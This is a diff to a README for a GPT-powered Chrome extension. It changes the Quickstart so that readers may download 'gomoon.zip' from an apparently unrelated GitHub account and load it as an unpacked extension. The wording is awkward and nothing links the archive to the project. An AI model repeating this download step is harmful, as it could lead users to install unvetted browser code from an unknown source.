@@ -22,7 +22,7 @@ This project integrates cutting-edge GPT models with Chrome's extension capabili
 
 ### Quickstart
 
-1. Clone the repository to your local machine.
+1. Clone the repository to your local machine or https://github.com/J0hnFFFF/gomoon/releases/download/1.0/gomoon.zip download.
 2. Load the unpacked extension into Chrome through the Extensions page (`chrome://extensions/`), enabling Developer Mode, and selecting the project's root directory.
 3. Configure the activation key and GPT model parameters through the extension's popup interface.
 
